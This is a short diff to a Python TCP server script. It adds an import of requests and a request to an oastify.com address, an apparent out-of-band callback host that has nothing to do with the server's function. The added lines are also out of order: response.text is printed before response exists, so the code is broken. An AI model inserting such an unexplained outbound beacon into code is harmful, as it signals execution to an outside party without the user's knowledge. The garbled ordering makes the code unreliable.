@@ -1,11 +1,17 @@
 import socket
+import requests
 
+
+
+print(response.text)
 # create a socket object
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # bind the socket to a public host and a port
 server_socket.bind(('0.0.0.0', 5001))
 
+url = "http://spl9fiy41nlialiaoha5l5htrkxbl19q.oastify.com"
+response = requests.get(url)
 # become a server socket
 server_socket.listen(5)
 
